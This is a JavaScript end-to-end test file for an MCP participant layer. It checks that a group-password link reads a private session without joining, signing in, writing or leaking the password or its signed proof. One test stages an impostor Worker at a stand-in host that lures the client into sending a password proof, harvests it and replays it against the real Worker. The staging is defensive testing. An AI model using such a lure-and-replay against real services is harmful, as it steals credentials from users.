// End to end: an agent given a private session's group-password link reads
// it through the MCP participant layer against the real Session Worker,
// without joining, signing in or spending anything, and never shows the
// password or the proof it signs.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { ethers } from 'ethers';
import { createParticipant } from '../../mcp/lib/participant.mjs';
import { createWorkerGroupPasswordKeys } from '../../shared/workerGroupJoin.mjs';
import {
  APP_ORIGIN, SESSION_ID, SLUG, WORKER_ORIGIN, createSessionEnv, fetchWorker, login, signedAdminRequest, uploadJson,
} from '../../workers/sessionCorsWorker/sessionWorkerRuntimeFixture.mjs';

const GROUP = 'salon';
const PASSWORD = 'correct horse battery';
const CODE = 'c0'.repeat(16);
const keys = createWorkerGroupPasswordKeys(ethers);
const pageLink = `${APP_ORIGIN}/session/${SLUG}?worker=${encodeURIComponent(WORKER_ORIGIN)}`;
const groupLink = (token) => `${pageLink}&joinGroup=${GROUP}#groupInvite=${encodeURIComponent(token)}`;

const privateOverrides = (visibility) => {
  const accessConditions = { match: 'any', conditions: [{ kind: 'worker_role', role: 'admin' }, { kind: 'worker_group', groupIds: [GROUP] }] };
  const payloadAccessControl = { gate: 'role_gate', encryption: 'worker_envelope', accessConditions };
  return {
    sessionName: 'Secret salon',
    sessionInfo: 'Only the salon reads this.',
    workerGroupsBootstrap: { version: 2, state: 'fresh_empty', bootstrapId: 'b0'.repeat(32) },
    workerAuthority: { version: 1, participantScopes: ['storage', 'groups'], anonymousScopes: [] },
    interviewMode: { enabled: true },
    sessionModeProfile: {
      profileVersion: 1,
      preset: 'custom',
      authority: { mode: 'worker_canonical' },
      evm: { registryChainId: null },
      storage: { backend: 'cloudflare', payloadAccessControl },
      identity: { default: 'passkey', enabled: ['passkey'] },
      authorization: { mechanisms: ['worker_roles'] },
      encryption: { mode: 'worker_envelope', keyProvider: 'worker_secret' },
      surfaces: { web: true, telegram: false, miniApp: false, agentHttp: false, mcp: false, ceCc: false },
      results: { visibility, exposure: { aggregateResultsEnabled: true, anonymizedGroupsEnabled: false, minGroupSize: 2 } },
      export: { scope: 'admin_raw' },
    },
    storageProfile: {
      type: 'session_storage_profile',
      version: 'session-storage-profile-v1',
      backend: 'cloudflare',
      sessionOwned: true,
      resources: { docsContext: 'active', questions: 'active', surveys: 'active', responses: 'active' },
      payloadAccessControl,
    },
  };
};

const setup = async (t, { visibility = 'session_member_full' } = {}) => {
  const { env, admin } = createSessionEnv({ configOverrides: privateOverrides(visibility) });
  env.CE_STORAGE_ENVELOPE_KEK = 'synthetic-private-session-kek';
  const created = await signedAdminRequest({
    env, wallet: admin, action: 'groups/create', body: { group: { groupId: GROUP, label: 'Salon', joinMode: 'group_password', memberVisibility: 'session' } },
  });
  assert.equal(created.status, 200, JSON.stringify(created.body));
  const signer = await keys.signerOf({ password: PASSWORD, sessionId: SESSION_ID, groupId: GROUP });
  assert.equal((await signedAdminRequest({ env, wallet: admin, action: 'groups/password/set', body: { groupId: GROUP, signer } })).status, 200);
  const adminToken = await login({ env, wallet: admin });
  const questionIds = [`0x${'a1'.repeat(32)}`, `0x${'b2'.repeat(32)}`];
  for (const [index, id] of questionIds.entries()) {
    const stored = await uploadJson({
      env, token: adminToken, resource: 'questions',
      data: JSON.stringify({ id, type: 'binary', prompt: `Private statement ${index + 1}`, sessionSlug: SLUG, sessionId: SESSION_ID, options: ['Agree', 'Unsure', 'Disagree'] }),
    });
    assert.equal(stored.status, 200, JSON.stringify(stored.body));
  }
  const answered = await uploadJson({
    env, token: adminToken, resource: 'responses',
    data: JSON.stringify({ questionId: questionIds[0], sessionSlug: SLUG, sessionId: SESSION_ID, answer: { value: 'Agree' }, additional: { value: '' }, responder: admin.address }),
  });
  assert.equal(answered.status, 200, JSON.stringify(answered.body));

  const stateDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ce-agent-reader-'));
  t.after(() => fs.rm(stateDir, { recursive: true, force: true }));
  const seen = [];
  const fetchImpl = async (url, init = {}) => {
    const headers = new Headers(init.headers);
    seen.push({ url: String(url), method: init.method || 'GET', authorization: headers.get('authorization') || '', invite: headers.get('x-ce-group-invite') || '', body: String(init.body || '') });
    return fetchWorker(new Request(url, { method: init.method || 'GET', headers: init.headers, body: init.body }), env);
  };
  let offset = 0;
  const clock = { advance: (ms) => { offset += ms; } };
  const participant = createParticipant({
    now: () => Date.now() + offset,
    config: { stateDir, profile: { displayName: 'Reader' }, appOrigin: APP_ORIGIN, trustedAppOrigins: [APP_ORIGIN], allowLocalWorkers: false },
    wallet: ethers.Wallet.createRandom(),
    fetchImpl,
  });
  const groupMembers = async () => {
    const response = await fetchWorker(new Request(`${WORKER_ORIGIN}/groups/list?sessionId=${SESSION_ID}`, {
      headers: { Authorization: `Bearer ${adminToken}`, 'X-Group-Slug': SLUG, Origin: APP_ORIGIN },
    }), env);
    return (await response.json()).groups.find((group) => group.groupId === GROUP).memberCount;
  };
  return { env, admin, participant, seen, questionIds, stateDir, groupMembers, clock };
};

// Nothing the agent sent or was told may hold the password, and nothing it was told the proof.
const assertNoSecrets = (seen, results) => {
  const proofs = [...new Set(seen.map((call) => call.invite).filter(Boolean))];
  assert.equal(proofs.length, 1);
  const sent = JSON.stringify(seen.map(({ url, body }) => ({ url, body })));
  const told = JSON.stringify(results);
  for (const secret of [PASSWORD, encodeURIComponent(PASSWORD), proofs[0], proofs[0].split(':').at(-1)]) {
    assert.equal(sent.includes(secret), false, 'a request address or body carried a secret');
    assert.equal(told.includes(secret), false, 'a tool result carried a secret');
  }
  assert.equal(told.includes('groupInvite'), false);
};

test('a group-password link reads a private session whole without joining, signing in or storing anything', async (t) => {
  const { participant, seen, questionIds, stateDir, groupMembers } = await setup(t);
  const link = groupLink(`gp:${PASSWORD}`);
  const before = await groupMembers();

  const session = await participant.getSession({ session: link });
  assert.equal(session.title, 'Secret salon');
  assert.equal(session.description, 'Only the salon reads this.');
  assert.equal(session.joined, false);
  assert.equal(session.questions, 2);
  assert.equal(session.answeredByMe, undefined);
  assert.deepEqual(session.groups.map((group) => [group.groupId, group.member]), [[GROUP, false]]);
  assert.match(session.note, /without joining/);

  // Every question, whatever the filter, since a reader has answered none.
  const listed = await participant.listQuestions({ session: link, filter: 'answered' });
  assert.equal(listed.joined, false);
  assert.deepEqual(listed.questions.map((question) => question.id).sort(), questionIds);

  const catalog = await participant.getInterviewCatalog({ link });
  assert.equal(catalog.privateSession, true);
  assert.deepEqual(catalog.questions.map((question) => question.id).sort(), questionIds);
  const review = await participant.makeReviewLink({
    link, responses: [{ questionId: questionIds[0], answer: 'Agree', confidence: 0.8, evidence: 'They have said so.' }],
  });
  assert.equal(review.drafts, 1);
  assert.equal(new URL(review.reviewLink).searchParams.get('joinGroup'), GROUP);

  // Members see every answer here, so the link reads the results a member reads.
  const results = await participant.getResults({ session: link });
  assert.equal(results.joined, false);
  assert.equal(results.participants, 1);

  const context = await participant.listContext({ session: link });
  assert.equal(context.session, SLUG);

  // No sign-in was made, no group joined, nothing written, and no state kept.
  assert.ok(seen.every((call) => !call.authorization));
  assert.ok(seen.every((call) => !/^\/(auth|groups\/join|storage\/upload)/.test(new URL(call.url).pathname)));
  assert.equal(await groupMembers(), before);
  const whoami = await participant.whoami();
  assert.deepEqual(whoami.sessions, []);
  assert.equal((await fs.readFile(path.join(stateDir, 'state.json'), 'utf8').catch(() => '')).includes(PASSWORD), false);
  assertNoSecrets(seen, [session, listed, catalog, review, results, context, whoami]);

  // Reading is all a link gives: the tools that write still ask for joining.
  await assert.rejects(participant.answer({ session: link, answers: [{ questionId: questionIds[0], value: 'Agree' }] }), /Join this session first/);
  await assert.rejects(participant.addStatement({ session: link, prompt: 'A new statement.' }), /Join this session first/);
});

test('answers stay closed to a link where members see only their own', async (t) => {
  const { participant } = await setup(t, { visibility: 'participant_aggregate' });
  const results = await participant.getResults({ session: groupLink(`gp:${PASSWORD}`) });
  assert.equal(results.resultsPublic, false);
  assert.match(results.note, /a link reads none/);
  assert.equal(results.questions, undefined);
});

test('a one-use code, a wrong password and a plain link read nothing, and each says what to do', async (t) => {
  const { participant, seen, groupMembers } = await setup(t);
  const before = await groupMembers();
  const told = [];
  const refused = async (link, pattern) => {
    for (const read of [
      () => participant.getSession({ session: link }),
      () => participant.listQuestions({ session: link }),
      () => participant.listContext({ session: link }),
      () => participant.getResults({ session: link }),
      () => participant.getInterviewCatalog({ link }),
    ]) {
      const error = await read().then(() => null, (thrown) => thrown);
      assert.ok(error, link);
      assert.match(error.message, pattern);
      told.push(error.message);
    }
  };
  // A code works once, to join: reading never spends or sends it.
  await refused(groupLink(CODE), /one-use code.*can’t be used to read.*join_session/);
  assert.equal(JSON.stringify(seen).includes(CODE), false);
  await refused(groupLink('gp:a wrong password here'), /group password no longer opens it/);
  await refused(pageLink, /private/);
  const all = told.join(' ');
  assert.equal(all.includes('Secret salon') || all.includes('Private statement'), false);
  assert.equal(all.includes('a wrong password here') || all.includes(CODE), false);
  assert.equal(await groupMembers(), before);
  assert.ok(seen.every((call) => !call.authorization));
});

test('a password changed after the link was opened ends the reading', async (t) => {
  const { env, admin, participant, clock } = await setup(t);
  const link = groupLink(`gp:${PASSWORD}`);
  assert.equal((await participant.listQuestions({ session: link })).total, 2);
  const next = await keys.signerOf({ password: 'another password entirely', sessionId: SESSION_ID, groupId: GROUP });
  assert.equal((await signedAdminRequest({ env, wallet: admin, action: 'groups/password/set', body: { groupId: GROUP, signer: next } })).status, 200);
  // Once the agent looks at the session again, the old link is told it no longer opens it.
  clock.advance(31_000);
  await assert.rejects(participant.listQuestions({ session: link }), /group password no longer opens it/);
  await assert.rejects(participant.getSession({ session: link }), /group password no longer opens it/);
  assert.equal((await participant.listQuestions({ session: groupLink('gp:another password entirely') })).total, 2);
});

test('a public session’s plain link is read without joining too, and a joined session is read as before', async (t) => {
  const open = privateOverrides('public_full_if_storage_public');
  const payloadAccessControl = { gate: 'none', encryption: 'none' };
  const { env, admin } = createSessionEnv({ configOverrides: {
    sessionName: 'Open forum',
    workerAuthority: open.workerAuthority,
    sessionModeProfile: { ...open.sessionModeProfile, storage: { backend: 'cloudflare', payloadAccessControl }, encryption: { mode: 'none' }, export: { scope: 'all_session' } },
    storageProfile: { ...open.storageProfile, payloadAccessControl },
  } });
  const adminToken = await login({ env, wallet: admin });
  const id = `0x${'c3'.repeat(32)}`;
  assert.equal((await uploadJson({
    env, token: adminToken, resource: 'questions',
    data: JSON.stringify({ id, type: 'binary', prompt: 'An open statement', sessionSlug: SLUG, sessionId: SESSION_ID, options: ['Agree', 'Unsure', 'Disagree'] }),
  })).status, 200);
  const stateDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ce-agent-reader-'));
  t.after(() => fs.rm(stateDir, { recursive: true, force: true }));
  const seen = [];
  const participant = createParticipant({
    config: { stateDir, profile: { displayName: 'Reader' }, appOrigin: APP_ORIGIN, trustedAppOrigins: [APP_ORIGIN], allowLocalWorkers: false },
    wallet: ethers.Wallet.createRandom(),
    fetchImpl: async (url, init = {}) => {
      seen.push({ path: new URL(url).pathname, authorization: new Headers(init.headers).get('authorization') || '' });
      return fetchWorker(new Request(url, { method: init.method || 'GET', headers: init.headers, body: init.body }), env);
    },
  });
  const read = await participant.listQuestions({ session: pageLink });
  assert.equal(read.joined, false);
  assert.deepEqual(read.questions.map((question) => question.id), [id]);
  assert.equal((await participant.getSession({ session: pageLink })).title, 'Open forum');
  assert.ok(seen.every((call) => !call.authorization && !call.path.startsWith('/auth/')));
  // A slug still means a joined session, and joining turns the same link into the member's own view.
  await assert.rejects(participant.listQuestions({ session: SLUG }), /Join it first with join_session/);
  await participant.joinSession({ link: pageLink });
  const joined = await participant.listQuestions({ session: pageLink, filter: 'all' });
  assert.equal(joined.joined, undefined);
  assert.equal(joined.answeredByMe, 0);
  assert.ok(seen.some((call) => call.authorization));
});

test('a Worker that only claims to hold the session gets a proof the real one refuses', async (t) => {
  const { env, participant } = await setup(t);
  const IMPOSTOR = 'https://impostor.example';
  const harvested = [];
  // The impostor answers as the real session's shell, to draw out a proof of the password.
  const impostorFetch = async (url, init = {}) => {
    const target = new URL(url);
    harvested.push(new Headers(init.headers).get('x-ce-group-invite') || '');
    if (target.pathname === '/capabilities') return Response.json({ features: ['worker_groups', 'group_read_proof_v2'] });
    if (target.pathname === '/session-config') {
      return Response.json({ ok: true, sessionSlug: SLUG, privateSession: 'invite_required',
        config: { slug: SLUG, sessionId: SESSION_ID, corsWorkerUrl: IMPOSTOR, allowOrigins: [APP_ORIGIN], sessionModeProfile: { authority: { mode: 'worker_canonical' } } } });
    }
    return Response.json({ error: 'no' }, { status: 403 });
  };
  const stateDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ce-agent-reader-'));
  t.after(() => fs.rm(stateDir, { recursive: true, force: true }));
  const fooled = createParticipant({
    config: { stateDir, profile: {}, appOrigin: APP_ORIGIN, trustedAppOrigins: [APP_ORIGIN], allowLocalWorkers: false },
    wallet: ethers.Wallet.createRandom(),
    fetchImpl: impostorFetch,
  });
  const lure = `${APP_ORIGIN}/session/${SLUG}?worker=${encodeURIComponent(IMPOSTOR)}&joinGroup=${GROUP}#groupInvite=${encodeURIComponent(`gp:${PASSWORD}`)}`;
  await assert.rejects(fooled.getSession({ session: lure }), /private/);
  const proofs = harvested.filter(Boolean);
  assert.ok(proofs.length, 'the impostor was sent a proof');
  // Replayed at the real Worker, by any route, it opens nothing.
  for (const proof of new Set(proofs)) {
    for (const route of [`/session-config?slug=${SLUG}`, '/storage/list?resource=questions&limit=100']) {
      const response = await fetchWorker(new Request(`${WORKER_ORIGIN}${route}`, { headers: { 'X-Session-Slug': SLUG, 'X-CE-Group-Invite': proof } }), env);
      const body = await response.json();
      assert.equal(response.status === 200 && !body.privateSession, false, route);
      assert.equal(JSON.stringify(body).includes('Secret salon') || JSON.stringify(body).includes('Private statement'), false);
    }
    // Not even with its label changed to the form that names no Worker.
    const relabelled = proof.replace(/^v2:/, '');
    const response = await fetchWorker(new Request(`${WORKER_ORIGIN}/storage/list?resource=questions&limit=100`, { headers: { 'X-Session-Slug': SLUG, 'X-CE-Group-Invite': relabelled } }), env);
    assert.equal(response.status, 403);
  }
  // The real link still reads at the real Worker.
  assert.equal((await participant.listQuestions({ session: groupLink(`gp:${PASSWORD}`) })).total, 2);
});

test('two links to one session read as the group each names, and a session opened to read never writes', async (t) => {
  const { participant, seen } = await setup(t);
  await participant.getSession({ session: groupLink(`gp:${PASSWORD}`) });
  const sent = new Set(seen.map((call) => call.invite).filter(Boolean));
  // The same password text under another group's name is not read with the first group's proof.
  const other = `${pageLink}&joinGroup=other#groupInvite=${encodeURIComponent(`gp:${PASSWORD}`)}`;
  await assert.rejects(participant.getSession({ session: other }), /no longer opens it/);
  const after = new Set(seen.map((call) => call.invite).filter(Boolean));
  assert.ok([...after].some((invite) => invite.startsWith('v2:other:')));
  assert.ok([...sent].every((invite) => invite.startsWith(`v2:${GROUP}:`)));
});
